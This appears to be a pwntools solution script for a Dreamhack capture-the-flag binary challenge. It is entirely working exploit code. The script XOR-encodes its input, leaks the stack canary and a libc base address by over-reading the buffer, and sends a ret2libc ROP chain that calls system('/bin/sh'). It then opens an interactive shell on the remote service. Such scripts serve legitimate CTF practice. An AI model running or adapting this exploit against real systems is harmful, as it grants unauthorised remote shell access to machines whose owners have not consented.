from pwn import *

elf = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = elf

# p = process()
p = remote("host1.dreamhack.games",  19929)
# gdb.attach(p, 'break *main+285')

def send_payload(payload: bytes, leak=True):
    output = list(payload)
    output[-1] = payload[-1]
    for i in range(len(payload) - 2, -1, -1):
        output[i] = output[i] ^ output[i + 1]
    payload =  b''.join([int.to_bytes(char) for char in output])
    p.sendafter(b'ut: ', payload)
    if(leak):
        p.recvuntil(b'entered: ')
        return p.recvuntil(b'\nInp', drop=True)

canary = u64(send_payload(b'a' * 0x19)[0x19:0x19+7].rjust(8,b'\x00'))
libcBase = u64(send_payload(b'a' * 0x28)[0x28:].ljust(8, b'\x00')) - 0x29d90

payload = b'a' * 0x18 + pack(canary) + b'a' * 8 + pack(0x0000000000029cd6 + libcBase) + pack(0x000000000002a3e5 + libcBase) + pack(next(libc.search(b'/bin/sh')) + libcBase) + pack(libc.symbols['system'] + libcBase)
send_payload(payload)
print(send_payload(b'exit\x00', False))
p.interactive()